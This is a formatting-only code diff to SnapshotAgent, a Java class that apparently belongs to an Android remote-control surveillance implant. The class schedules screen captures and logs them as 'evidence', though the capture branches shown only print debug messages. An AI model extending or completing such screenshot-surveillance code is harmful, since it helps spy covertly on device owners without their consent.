@@ -21,16 +21,16 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class SnapshotAgent.
  */
 public class SnapshotAgent extends AgentBase {
-	
+
 	/** The Constant CAPTURE_FULLSCREEN. */
 	final private static int CAPTURE_FULLSCREEN = 0;
-	
+
 	/** The Constant CAPTURE_FOREGROUND. */
 	final private static int CAPTURE_FOREGROUND = 1;
 
 	/** The delay. */
 	private int delay;
-	
+
 	/** The type. */
 	private int type;
 
@@ -41,9 +41,12 @@ public class SnapshotAgent extends AgentBase {
 		Log.d("RCS", "SnapshotAgent constructor");
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
 	 */
+	@Override
 	public void parse(final byte[] conf) {
 		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);
 
@@ -51,23 +54,29 @@ public class SnapshotAgent extends AgentBase {
 		this.type = myConf.getInt();
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
 	 */
+	@Override
 	public void begin() {
 		setDelay(1000);
 		setPeriod(this.delay);
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
 	 */
+	@Override
 	public void go() {
 		final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);
 
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
-			
+
 			Log.d("RCS", "Snapshot Agent: logging full screen");
 			break;
 
@@ -83,9 +92,12 @@ public class SnapshotAgent extends AgentBase {
 		log.close();
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
 	 */
+	@Override
 	public void end() {
 
 	}
